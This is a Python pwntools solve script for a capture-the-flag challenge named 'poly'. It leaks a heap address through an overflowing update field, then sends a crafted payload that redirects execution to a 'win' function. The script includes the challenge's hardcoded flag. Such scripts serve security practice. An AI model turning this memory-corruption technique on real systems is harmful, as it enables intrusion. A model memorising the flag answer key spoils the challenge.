#!/usr/bin/env python3

from pwn import *
import sys, os

POLY_FLAG = b"magpie{P0LYm0RPhi5M_4_7H3_wiN_a935ef442}"

def solve(host="bin.magpiectf.ca", port=6643):
    #p = process("./poly")
    p = remote(host, port)
    #p = gdb.debug("./poly", "")
    #p = serialtube("/dev/pts/7")

    def create(item):
        p.recvuntil("> ")
        p.sendline("1")
        p.recvuntil(": ")
        p.sendline(item)

    def enterUpdates():
        p.recvuntil("> ")
        p.sendline("2")

    def getItem():
        p.recvuntil("Enter new value for item ")
        str = p.recvuntil(": ")
        num = int(str[0:-2])
        return num

    def updateItem(value):
        num = getItem()
        p.sendline(value)
        return num
    
    #aout = ELF("./poly")
    win = 0x402880 # aout.symbols["win"]

    create("123")
    create("456")
    create("UUUUUUUUUUUUUUU")

    enterUpdates()
    updateItem("abcd")
    updateItem("hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh")

    leak = getItem()
    heapaddr = leak + 0x13f20
    print("Leaked heap address: %#08x" % leak)
    print("Target Address: %#08x" % heapaddr)

    p.sendline(p64(heapaddr-8) + p64(win) + b"U"*5)

    flag = p.recvline().rstrip()
    print("got flag: \"" + flag.decode("ascii") + "\"")
    return flag == POLY_FLAG

def main():
    global POLY_FLAG

    if len(sys.argv) >=3:
        target_host = sys.argv[1]
        target_port = int(sys.argv[2])
    else:
        target_host = os.environ.get('TARGET_HOSTNAME') or "pwn-poly"
        target_port = int(os.environ.get('TARGET_PORT') or 31337)

    print("Hardcoded flag: " + POLY_FLAG.decode("ascii"))

    try:
        fname = 'flag.txt'
        if os.path.exists(fname):
            with open(fname,'rb') as f:
                local_flag = f.read().rstrip()
                print("Local flag: " + local_flag.decode("ascii"))
                print("Using Local Flag.")
                POLY_FLAG = local_flag
    except:
        print("Unexpected error reading local flag. Using Hardcoded flag.")

    match = solve(target_host, target_port)
    print("Match = " + str(match))

    sys.exit(not match)

if __name__ == "__main__":
    main()